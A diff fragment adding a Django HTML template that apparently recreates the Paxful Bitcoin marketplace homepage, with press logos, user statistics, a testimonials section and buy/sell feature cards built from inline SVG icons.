+                div{background: url(https://img.youtube.com/vi/KUqtlA0Joh0/hqdefault.jpg) no-repeat center center;background-size:cover;height:100%}
+                a:hover span {background-color: #0097DB}
+                span{position:absolute;width:48px;height:48px;border-radius:50%;background:#00A5EF url(&quot;/assets/icons/16/play.svg&quot;) no-repeat 17px 50%;top:calc(50% - 24px);left:calc(50% - 24px);}
+            </style>
+            <a href='https://www.youtube.com/embed/KUqtlA0Joh0?autoplay=1&amp;mute=1&amp;enablejsapi=1'><div></div><span></span></a>
+        "></iframe></div></div> -->
+          <!-- <div id="carouselExampleControls" class="carousel slide" data-ride="carousel">
+            <div class="carousel-inner">
+              <div class="carousel-item active">
+                <img class="d-block w-100" src="{% static 'images/voa.png' %}" alt="First slide">
+              </div>
+              <div class="carousel-item">
+                <img class="d-block w-100" src="{% static 'images/bitcoin-magazine.webp' %}" alt="Second slide">
+              </div>
+              <div class="carousel-item">
+                <img class="d-block w-100" src="{% static 'images/voa.png' %}" alt="Third slide">
+              </div>
+            </div>
+            <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
+              <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+              <span class="sr-only">Previous</span>
+            </a>
+            <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
+              <span class="carousel-control-next-icon" aria-hidden="true"></span>
+              <span class="sr-only">Next</span>
+            </a>
+          </div> -->
+      </div>
+      <div class="container">
+      <div class="mb-7">
+        <div class="position-relative px-xs-5 py-xs-3 dir-ltr w-100 position-relative">
+          <div class="w-100">
+            <div class="overflow-hidden is-draggable">
+            <div class="d-flex" style="transform: translate3d(40%, 0px, 0px);">
+              <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center is-selected" style="left: 0%;">
+                <a target="_blank" rel="noopener noreferrer" href="https://www.coindesk.com/paxful-bitcoin-crypto/">
+                  <img alt="coindesk" src="{% static 'images/coindesk.webp' %}" class="_4nbV-"></a>
+                </div>
+                <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center is-selected" style="left: 0%;">
+                  <a target="_blank" rel="noopener noreferrer" href="https://www.nasdaq.com/articles/paxful-ceo-ray-youssef-shows-how-bitcoin-can-be-used-for-social-good-2018-09-14">
+                    <img alt="nasdaq" src="{% static 'images/nasdaq.webp' %}" class="_4nbV-"></a>
+                </div>
+                <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center is-selected" style="left: 0%;">
+                  <a target="_blank" rel="noopener noreferrer" href="https://www.forbes.com/sites/rebeccacampbell1/2019/01/16/africa-is-ahead-of-western-countries-adopting-p2p-finance-says-paxfuls-ceo/">
+                    <img alt="forbes" src="{% static 'images/forbes.webp' %}" class="_4nbV-"></a>
+                  </div>
+                  <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                    <a target="_blank" rel="noopener noreferrer" href="https://finance.yahoo.com/news/price-dip-aside-paxful-anticipates-161236935.html">
+                      <img alt="yahoo-finance" src="/assets/images/home/partners/yahoo-finance.png" class="_4nbV-"></a>
+                    </div>
+                    <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                      <a target="_blank" rel="noopener noreferrer" href="https://cointelegraph.com/press-releases/peer-to-peer-bitcoin-marketplace-paxful-completes-second-school-in-rwanda">
+                        <img alt="coin-telegraph" src="/assets/images/home/partners/cointelegraph.png" class="_4nbV-"></a>
+                      </div>
+                      <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                        <a target="_blank" rel="noopener noreferrer" href="https://www.voanews.com/africa/philanthropy-aids-rwandas-push-more-preschools">
+                          <img alt="voa" src="{% static 'images/voa.png' %}" class="_4nbV-"></a>
+                        </div>
+                        <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                          <a target="_blank" rel="noopener noreferrer" href="https://bitcoinmagazine.com/articles/paxful-ceo-ray-youssef-shows-how-bitcoin-can-be-used-social-good/">
+                            <img alt="bitcoin-magazine" src="/assets/images/home/partners/bitcoin-magazine.png" class="_4nbV-"></a>
+                          </div>
+                          <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                            <a target="_blank" rel="noopener noreferrer" href="https://bitcoinist.com/paxful-celebrates-news-of-noted-south-african-business-school-accepting-bitcoin/">
+                              <img alt="bitcoinist" src="/assets/images/home/partners/bitcoinist.png" class="_4nbV-"></a>
+                            </div>
+                            <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                              <a target="_blank" rel="noopener noreferrer" href="https://decrypt.co/10757/paxful-3-million-wallets-800000-last-year-africa-india">
+                              <img alt="decrypt" src="/assets/images/home/partners/decrypt.png" class="_4nbV-"></a>
+                            </div>
+                            <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                              <a target="_blank" rel="noopener noreferrer" href="https://www.badcredit.org/news/paxful-allows-users-to-pay-and-earn-incentives-with-bitcoin/  "><img alt="badcredit" src="/assets/images/home/partners/badcredit.png" class="_4nbV-"></a>
+                            </div>
+                            <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                              <a target="_blank" rel="noopener noreferrer" href="https://www.yahoo.com/tech/bitcoin-put-him-street-then-101557959.html">
+                                <img alt="digital-trends" src="/assets/images/home/partners/digital-trends.png" class="_4nbV-"></a>
+                              </div>
+                              <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center">
+                                <a target="_blank" rel="noopener noreferrer" href="https://irishtechnews.ie/paxful-expands-builtwithbitcoin-initiative-with-scholarship-program-for-afghan-refugees/"><img alt="irishtechnews" src="/assets/images/home/partners/irishtechnews.png" class="_4nbV-"></a>
+                              </div>
+                              <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center"><a target="_blank" rel="noopener noreferrer" href="https://www.newsbtc.com/2018/03/26/paxful-improving-financial-empowerment-bitcoin-underbanked-regions/"><img alt="newsbtc" src="/assets/images/home/partners/newsbtc.png" class="_4nbV-"></a></div><div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center"><a target="_blank" rel="noopener noreferrer" href="https://insidebitcoins.com/cryptocurrency-exchanges/paxful-review"><img alt="insidebitcoins" src="/assets/images/home/partners/inside-bitcoins.png" class="_4nbV-"></a></div><div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center"><a target="_blank" rel="noopener noreferrer" href="https://www.cardrates.com/news/paxful-is-a-p2p-bitcoin-platform-using-crypto-to-build-schools-in-africa/"><img alt="cardrates" src="/assets/images/home/partners/card-rates.png" class="_4nbV-"></a></div>
+                              <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center is-selected" style="left: -339.976%;">
+                                <a target="_blank" rel="noopener noreferrer" href="https://coingeek.com/p2p-marketplace-paxful-focuses-on-youth-of-africa-and-its-paying-off/">
+                                  <img alt="coingeek" src="{% static 'images/coingeek.webp' %}" class="_4nbV-"></a>
+                                </div>
+                                <div class="jja1h d-flex position-relative px-3 justify-content-center align-items-center is-selected" style="left: -339.976%;">
+                                  <a target="_blank" rel="noopener noreferrer" href="https://blockchain.news/news/is-bitcoin-in-india-about-to-boom-paxful-survey-projection">
+                                    <img alt="blockchain-news" src="{% static 'images/blockchain-news.webp' %}" class="_4nbV-"></a>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                            <div class="_2aqeu position-absolute kKrtp w-100 mx-auto">
+                              <button type="button" class="ylzne qY1-B position-absolute text-gray-600 _0kt9C btn btn-unstyled btn-md">
+                                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor " class="fdg">
+                                  <path fill-rule="evenodd" d="M11.706 13.292L6.414 7.999l5.292-5.293a1 1 0 00-1.414-1.414l-6 6a.996.996 0 00-.277.53L4 7.94v.118c.014.236.11.468.291.648l6 6a1 1 0 101.414-1.414z" clip-rule="evenodd"></path>
+                                </svg>
+                              </button>
+                              <button type="button" class="ylzne qY1-B position-absolute text-gray-600 dkSeG btn btn-unstyled btn-md">
+                                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="dfg">
+                                  <path fill-rule="evenodd" d="M4.294 13.292l5.292-5.293-5.292-5.293a1 1 0 111.414-1.414l6 6a.99.99 0 01.277.53L12 7.94v.118a.996.996 0 01-.291.648l-6 6a1 1 0 11-1.414-1.414z" clip-rule="evenodd"></path>
+                                </svg>
+                              </button>
+                            </div>
+                          </div>
+                        </div>
+         
+      
+      
+                          </div>
+      <div class="experince">
+            <h1>Your Bitcoin. Your experience.</h1>
+            <p>Buy and sell with people around the world just like you using your own prices and payment methods.</p>
+          </div>
+        
+        <div class="container">
+        <div class="row mb-4 mb-md-5 row1"><div class="col-md-4 mb-3 mb-md-0">
+            <article class="_3Mobz p-3 p-lg-4">
+              <div class="dDmZ2"><svg width="64" height="64" fill="none" viewBox="0 0 64 64" class="d-block mr-2 mr-lg-3 mr-xl-4 icon-multicolor">
+                    <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M16 38h2v20.426l14-6.57 14 6.57V38h2v23.574l-16-7.51-16 7.51V38z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M54 28c0 12.15-9.85 22-22 22s-22-9.85-22-22S19.85 6 32 6s22 9.85 22 22z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M54 25c0 12.15-9.85 22-22 22s-22-9.85-22-22S19.85 3 32 3s22 9.85 22 22z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M32 4c-11.598 0-21 9.402-21 21s9.402 21 21 21 21-9.402 21-21S43.598 4 32 4zM9 25C9 12.297 19.297 2 32 2s23 10.297 23 23-10.297 23-23 23S9 37.703 9 25z" clip-rule="evenodd"></path><path fill="#00A5EF" d="M53 26.5C53 37.822 43.598 47 32 47s-21-9.178-21-20.5S20.402 6 32 6s21 9.178 21 20.5z" opacity="0.2"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M32 15l2.597 7.64H43l-6.798 4.72L38.798 35 32 30.279 25.202 35l2.596-7.64L21 22.64h8.403L32 15z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M32 14a1 1 0 01.947.678l2.366 6.961H43a1 1 0 01.57 1.822l-6.179 4.291 2.354 6.926a1 1 0 01-1.517 1.143L32 31.496l-6.228 4.325a1 1 0 01-1.517-1.143l2.354-6.926-6.18-4.291A1 1 0 0121 21.639h7.687l2.366-6.96A1 1 0 0132 14zm0 4.107l-1.65 4.854a1 1 0 01-.947.678h-5.21l4.176 2.9a1 1 0 01.376 1.143l-1.619 4.764 4.304-2.989a1 1 0 011.14 0l4.304 2.99-1.62-4.765a1 1 0 01.377-1.143l4.176-2.9h-5.21a1 1 0 01-.947-.678L32 18.107z" clip-rule="evenodd"></path></svg></div><div><p class="mb-0"><strong class="h1 h1-responsive text-secondary lh-40">12,000+</strong></p><p class="mb-0 small-text">Active offers</p></div></article></div><div class="col-md-4 mb-3 mb-md-0"><article class="_3Mobz p-3 p-lg-4"><div class="dDmZ2"><svg width="64" height="64" fill="none" viewBox="0 0 64 64" class="d-block mr-2 mr-lg-3 mr-xl-4 icon-multicolor"><path fill="var(--icons-bg-fill, #ffffff)" d="M52.75 11.25a2.75 2.75 0 11-5.5 0 2.75 2.75 0 015.5 0z"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M50 9.5a1.75 1.75 0 100 3.5 1.75 1.75 0 000-3.5zm-3.75 1.75a3.75 3.75 0 117.5 0 3.75 3.75 0 01-7.5 0z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M40 14c0-5.523 4.477-10 10-10s10 4.477 10 10a9.984 9.984 0 01-3.9 7.924C55.15 19.83 52.631 18.5 50 18.5s-5.149 1.33-6.1 3.424A9.984 9.984 0 0140 14zm5.637 9A9.96 9.96 0 0050 24a9.96 9.96 0 004.363-1c-.464-1.318-2.075-2.5-4.363-2.5-2.288 0-3.9 1.182-4.363 2.5zM50 2c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12S56.627 2 50 2z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M16.75 47.25a2.75 2.75 0 11-5.5 0 2.75 2.75 0 015.5 0z"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M14 45.5a1.75 1.75 0 100 3.5 1.75 1.75 0 000-3.5zm-3.75 1.75a3.75 3.75 0 117.5 0 3.75 3.75 0 01-7.5 0z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M4 50c0-5.523 4.477-10 10-10s10 4.477 10 10a9.984 9.984 0 01-3.9 7.924C19.15 55.83 16.631 54.5 14 54.5s-5.149 1.33-6.1 3.424A9.984 9.984 0 014 50zm5.637 9A9.96 9.96 0 0014 60a9.96 9.96 0 004.363-1c-.464-1.318-2.075-2.5-4.363-2.5-2.289 0-3.9 1.182-4.363 2.5zM14 38C7.373 38 2 43.373 2 50s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M52 37c0 11.046-8.954 20-20 20s-20-8.954-20-20 8.954-20 20-20 20 8.954 20 20z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M52 32c0 11.046-8.954 20-20 20s-20-8.954-20-20 8.954-20 20-20 20 8.954 20 20z"></path><path fill="#00A5EF" d="M52 33c0 9.941-8.954 18-20 18s-20-8.059-20-18 8.954-18 20-18 20 8.059 20 18z" opacity="0.2"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M32 38.667c-6.627 0-12 4.347-12 9.71 4 3.237 14.4 7.769 24 0 0-5.363-5.373-9.71-12-9.71z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M32 39.667c-6.283 0-11 4.087-11 8.71h-2c0-6.102 6.028-10.71 13-10.71s13 4.608 13 10.71h-2c0-4.623-4.717-8.71-11-8.71z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M32 13c-10.493 0-19 8.507-19 19s8.507 19 19 19 19-8.507 19-19-8.507-19-19-19zM11 32c0-11.598 9.402-21 21-21s21 9.402 21 21-9.402 21-21 21-21-9.402-21-21z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M39 27a7 7 0 11-14 0 7 7 0 0114 0z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M32 21a6 6 0 100 12 6 6 0 000-12zm-8 6a8 8 0 1116 0 8 8 0 01-16 0z" clip-rule="evenodd"></path></svg></div><div><p class="mb-0"><strong class="h1 h1-responsive text-secondary lh-40">12,000+</strong></p><p class="mb-0 small-text">Verified sellers</p></div></article></div><div class="col-md-4 mb-0"><article class="_3Mobz p-3 p-lg-4"><div class="dDmZ2"><svg width="64" height="64" fill="none" viewBox="0 0 64 64" class="d-block mr-2 mr-lg-3 mr-xl-4 icon-multicolor"><path fill="var(--icons-bg-fill, #ffffff)" fill-rule="evenodd" d="M38.96 22.084c1.486-1.459 3.933.039 3.31 2.025l-3.786 12.084h15.101c2.824 0 4.759 2.848 3.72 5.473l-6.803 17.175A5 5 0 0145.853 62H29a5 5 0 01-5-5V38.872a5 5 0 011.497-3.568l13.464-13.22z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M38.96 22.084c1.486-1.459 3.933.039 3.31 2.025l-3.786 12.084h15.101c2.824 0 4.759 2.848 3.72 5.473l-6.803 17.175A5 5 0 0145.853 62H29a5 5 0 01-5-5V38.872a5 5 0 011.497-3.568l13.464-13.22zm1.402 1.427L26.898 36.73A3 3 0 0026 38.87V57a3 3 0 003 3h16.853a3 3 0 002.79-1.895l6.802-17.175a2 2 0 00-1.86-2.736H37.122a1 1 0 01-.954-1.3l4.194-13.383z" clip-rule="evenodd"></path><path fill="#00A5EF" d="M37.24 30.76l-8.068 8.068A4 4 0 0028 41.657V54a4 4 0 004 4h14.918a4 4 0 003.694-2.464l4.662-11.214c.821-1.976-.63-4.152-2.77-4.152H37.388l1.543-8.524c.174-.965-.998-1.578-1.691-.886z" opacity="0.2"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M17 38h-5v-2h5a3 3 0 013 3v20a3 3 0 01-3 3H5v-2h12a1 1 0 001-1V39a1 1 0 00-1-1z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M17.966 25.206a1 1 0 11.518-1.932l3.22.863a1 1 0 01-.518 1.932l-3.22-.863zm5.159-11.332a1 1 0 011.414-1.414l4.71 4.71a1 1 0 01-1.413 1.415l-4.711-4.71zm33.287 12.41a1 1 0 10-.257-1.984l-3.306.428a1 1 0 10.257 1.984l3.306-.428zM47.351 4.882a1 1 0 00-1.889-.657l-2.847 8.185a1 1 0 101.89.657l2.846-8.185zm7.769 11.83a1 1 0 10-.737-1.86l-5.54 2.2a1 1 0 10.737 1.859l5.54-2.2zM31.996 3.483a1 1 0 111.932-.517l2.558 9.547a1 1 0 01-1.932.517l-2.558-9.546z"></path></svg></div><div><p class="mb-0"><strong class="h1 h1-responsive text-secondary lh-40">6,000,000+</strong>
+                  </p><p class="mb-0 small-text">Users around the world</p>
+              </div>
+          </article>
+        </div>
+      </div>
+      <div class="tardebtn">
+        <a href="https://paxful.com/vendors" class="d-block d-md-inline-block btn btn-primary btn-lg">Start Trading</a>
+      </div>
+  </section>
+  <section id="testimonials">
+    <div class="container">
+      <h2 class="h1 mb-2 col-md-6 mx-auto px-0">Testimonials.</h2>
+      <p class="small-text mb-4 col-md-8 mx-auto px-0">Wondering what our users think about using Paxful? Let them tell you in their own words:</p>
+    
+    
+      <div class="test">
+      <div class="row">
+        <div class="col prevbtn">
+          <button type="button" class="ylzne j4qGn text-gray-600 position-absolute V0nc5 px-2 px-lg-0 btn btn-unstyled btn-md"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path fill-rule="evenodd" d="M11.706 13.292L6.414 7.999l5.292-5.293a1 1 0 00-1.414-1.414l-6 6a.996.996 0 00-.277.53L4 7.94v.118c.014.236.11.468.291.648l6 6a1 1 0 101.414-1.414z" clip-rule="evenodd"></path></svg></button>
+        </div>
+        <div class="tes">
+        <div class="col test1">
+          <fieldset class="reset">
+            <legend class="reset"><img class="Avatar" src="https://s3.amazonaws.com/paxful/avatar/2016/10/64d79449f604f590f6e2a9dffca3b47b.jpg?v=1593613146" alt="MaineBitcoin"></legend>
+            <a href="https://paxful.com/user/MaineBitcoin" class="d">MaineBitcoin</a>
+            <p>Being a paxful vendor has been great. Support is always responsive and helpful, and best of all I've been able to help many new Bitcoin users get some of their first Bitco…</p>
+          </fieldset>   
+        </div>
+
+        <div class="col test2">
+          <fieldset class="reset">
+            <legend class="reset"><img class="Avatar" src="https://s3.amazonaws.com/paxful/avatar/2016/10/64d79449f604f590f6e2a9dffca3b47b.jpg?v=1593613146" alt="MaineBitcoin"></legend>
+            <a href="https://paxful.com/user/MaineBitcoin" class="d">Eximius</a>
+            <p>Being a paxful vendor has been great. Support is always responsive and helpful, and best of all I've been able to help many new Bitcoin users get some of their first Bitco…</p>
+          </fieldset>   
+        </div>
+        </div>
+        <div class="col nextbtn">
+        <button type="button" class="ylzne j4qGn text-gray-600 position-absolute GPS1w px-2 px-lg-0 btn btn-unstyled btn-md">
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+          <path fill-rule="evenodd" d="M4.294 13.292l5.292-5.293-5.292-5.293a1 1 0 111.414-1.414l6 6a.99.99 0 01.277.53L12 7.94v.118a.996.996 0 01-.291.648l-6 6a1 1 0 11-1.414-1.414z" clip-rule="evenodd"></path>
+        </svg>
+      </button>
+      </div>
+      </div>
+ 
+
+           
+
+        </div>
+      </div>
+
+    </div>
+
+
+  
+
+      
+  </section>
+  <section class="finance">
+    <div class="container">
+      <div class="finance">
+    <h1>Welcome to a financial system <br>for the 100%.</h1>
+  </div>
+    <div class="row"><div class="col-md-4 mb-2 mb-md-0">
+      <div class="h-100 actionsBoard__card card border-0 p-3 p-sm-4 flex-grow d-flex text-dark text-center">
+        <div class="d-flex flex-column align-items-center">
+          <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="multicolor mb-2 icon-multicolor">
+            <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M27 19h2v2h2v-2h2v2.126a4.002 4.002 0 012.063 6.447A4 4 0 0133 35v2h-2v-2h-2v2h-2v-2h-2v-2h2V23h-2v-2h2v-2zm2 14h4a2 2 0 100-4h-4v4zm0-6h3a2 2 0 100-4h-3v4z" clip-rule="evenodd"></path>
+            <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M30 44c8.837 0 16-7.163 16-16s-7.163-16-16-16-16 7.163-16 16 7.163 16 16 16zm0 2c9.941 0 18-8.059 18-18s-8.059-18-18-18-18 8.059-18 18 8.059 18 18 18z" clip-rule="evenodd"></path>
+            <path fill="var(--icons-secondary, #454c59)" d="M4 8a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H6a2 2 0 01-2-2V8z" opacity="0.15"></path>
+            <path fill="var(--icons-bg-fill, #ffffff)" d="M1 5a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H3a2 2 0 01-2-2V5z"></path>
+            <path fill="#00A5EF" d="M25 6H6a2 2 0 00-2 2v17h21V6z" opacity="0.2"></path>
+            <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M0 5a3 3 0 013-3h20a3 3 0 013 3v18a3 3 0 01-3 3H3a3 3 0 01-3-3V5zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h20a1 1 0 001-1V5a1 1 0 00-1-1H3z" clip-rule="evenodd"></path>
+            <path fill="var(--icons-primary, #0097db)" d="M8 15a1 1 0 110-2h10a1 1 0 110 2H8z"></path>
+            <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M12.293 19.707a1 1 0 010-1.414L16.586 14l-4.293-4.293a1 1 0 011.414-1.414l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
+          </svg><strong class="d-block h4 ml-3 ml-md-0 mb-2">Buy Bitcoin</strong></div><p class="mb-0 regular-18">
+            <a href="https://paxful.com/buy-bitcoin">Buy Bitcoin</a> from real people in our peer-to-peer Marketplace.</p>
+          </div>
+        </div>
+        <div class="col-md-4 mb-2 mb-md-0"><div class="h-100 actionsBoard__card card border-0 p-3 p-sm-4 flex-grow d-flex text-dark text-center"><div class="d-flex flex-column align-items-center"><svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="multicolor mb-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M15 19h2v2h2v-2h2v2.126a4.002 4.002 0 012.063 6.447A4 4 0 0121 35v2h-2v-2h-2v2h-2v-2h-2v-2h2V23h-2v-2h2v-2zm2 14h4a2 2 0 100-4h-4v4zm0-6h3a2 2 0 100-4h-3v4z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M18 44c8.837 0 16-7.163 16-16s-7.163-16-16-16S2 19.163 2 28s7.163 16 16 16zm0 2c9.941 0 18-8.059 18-18s-8.059-18-18-18S0 18.059 0 28s8.059 18 18 18z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M20 8a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H22a2 2 0 01-2-2V8z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M23 5a2 2 0 012-2h20a2 2 0 012 2v18a2 2 0 01-2 2H25a2 2 0 01-2-2V5z"></path><path fill="#00A5EF" d="M23 6h19a2 2 0 012 2v17H23V6z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M22 5a3 3 0 013-3h20a3 3 0 013 3v18a3 3 0 01-3 3H25a3 3 0 01-3-3V5zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h20a1 1 0 001-1V5a1 1 0 00-1-1H25z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" d="M30 15a1 1 0 110-2h10a1 1 0 110 2H30z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M34.293 19.707a1 1 0 010-1.414L38.586 14l-4.293-4.293a1 1 0 011.414-1.414l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0z" clip-rule="evenodd"></path></svg><strong class="d-block h4 ml-3 ml-md-0 mb-2">Sell Bitcoin</strong></div><p class="mb-0 regular-18">Set your own rates and choose how you want to be paid.</p></div></div><div class="col-md-4 mb-2 mb-md-0"><div class="h-100 actionsBoard__card card border-0 p-3 p-sm-4 flex-grow d-flex text-dark text-center"><div class="d-flex flex-column align-items-center"><svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="multicolor mb-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M23.329 43.012l3.372 2.88a2 2 0 002.598 0l16-13.659A2 2 0 0046 30.712V9.76a2 2 0 00-1.663-1.972l-5.562-.95A2 2 0 0139 7.76v20.95a2 2 0 01-.702 1.522l-14.97 12.78z" clip-rule="evenodd" opacity="0.15"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M21 1.985l16.505 2.818A3 3 0 0140 7.761v20.95a3 3 0 01-1.052 2.283l-16 13.658a3 3 0 01-3.896 0l-16-13.659A3 3 0 012 28.713V7.76a3 3 0 012.495-2.958L21 1.985zm0 2.03L4.832 6.774A1 1 0 004 7.76v20.95a1 1 0 00.35.761l16 13.659a1 1 0 001.3 0l16-13.659a1 1 0 00.35-.76V7.76a1 1 0 00-.832-.986L21 4.015z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M9 12.736a2 2 0 011.663-1.971L21 9l10.337 1.765A2 2 0 0133 12.736v13.098a2 2 0 01-.702 1.52l-10 8.538a2 2 0 01-2.596 0l-10-8.537A2 2 0 019 25.834V12.736z"></path><path fill="#00A5EF" d="M12 15.663a2 2 0 011.578-1.955L21.5 12l9.925 2.158A2 2 0 0133 16.112v8.98a2 2 0 01-.683 1.506l-10.032 8.777a2 2 0 01-2.597.032L12.72 29.6a2 2 0 01-.72-1.537v-12.4z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M21 7.985L31.505 9.78A3 3 0 0134 12.736v13.098a3 3 0 01-1.052 2.281l-10 8.537a3 3 0 01-3.896 0l-10-8.537A3 3 0 018 25.834V12.736a3 3 0 012.495-2.957L21 7.985zm0 2.03L10.832 11.75a1 1 0 00-.832.985v13.098a1 1 0 00.35.76l10 8.537a1 1 0 001.3 0l10-8.537a1 1 0 00.35-.76V12.736a1 1 0 00-.832-.986L21 10.014z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M24 21a3 3 0 11-6 0 3 3 0 016 0z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M21 19a2 2 0 100 4 2 2 0 000-4zm-4 2a4 4 0 118 0 4 4 0 01-8 0z" clip-rule="evenodd"></path></svg><strong class="d-block h4 ml-3 ml-md-0 mb-2">Secure trading</strong></div><p class="mb-0 regular-18">Bitcoin is held in secure escrow until a trade is successfully completed.</p></div></div><div class="col-md-4 mb-2 mb-md-0 mt-md-4"><div class="h-100 actionsBoard__card card border-0 p-3 p-sm-4 flex-grow d-flex text-dark text-center"><div class="d-flex flex-column align-items-center"><svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="multicolor mb-2 icon-multicolor"><path fill="var(--icons-bg-fill, #ffffff)" fill-rule="evenodd" d="M11.273 8.545c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0119 15.903V28L9 40V15.903c0-1.584.342-3.149 1.002-4.588l1.271-2.77z" clip-rule="evenodd"></path><path fill="#00A5EF" d="M13 15.99V35.5l5-6.5V14l-2.5-5.5-1.518 3.169a10 10 0 00-.982 4.32z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M13.091 9.379a1 1 0 011.818 0l1.271 2.77a9 9 0 01.82 3.754V16h-6v-.097a9 9 0 01.82-3.754l1.271-2.77zM11 18v20l-2 2V15.903c0-1.584.342-3.149 1.002-4.588l1.271-2.77c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0119 15.903V30.5h-2V18h-6z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" fill-rule="evenodd" d="M31.273 8.545c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0139 15.903V40L29 28V15.903a11 11 0 011.002-4.588l1.271-2.77z" clip-rule="evenodd"></path><path fill="#00A5EF" d="M35 15.99V35.5L30 29V14l2.5-5.5 1.518 3.169a10 10 0 01.982 4.32z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M33.091 9.379a1 1 0 011.818 0l1.271 2.77a9 9 0 01.82 3.754V16h-6v-.097a9 9 0 01.82-3.754l1.271-2.77zM31 18v12.5h-2V15.903a11 11 0 011.002-4.588l1.271-2.77c1.07-2.332 4.384-2.332 5.454 0l1.27 2.77A11 11 0 0139 15.903V40l-2-2V18h-6z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M25.747 1.081c-.762-1.369-2.732-1.369-3.494 0L18.39 8.013A11 11 0 0017 13.367v15.304l-6.653 9.03-5.553 2.578C1.879 41.632 2.844 46 6.057 46H19v-3h10v3h12.943c3.213 0 4.178-4.368 1.263-5.721l-5.553-2.578L31 28.67V13.367a11 11 0 00-1.39-5.354l-3.863-6.932zm-5.61 7.906L24 2.055l3.862 6.932A9 9 0 0129 13.367V41H19V13.367a9 9 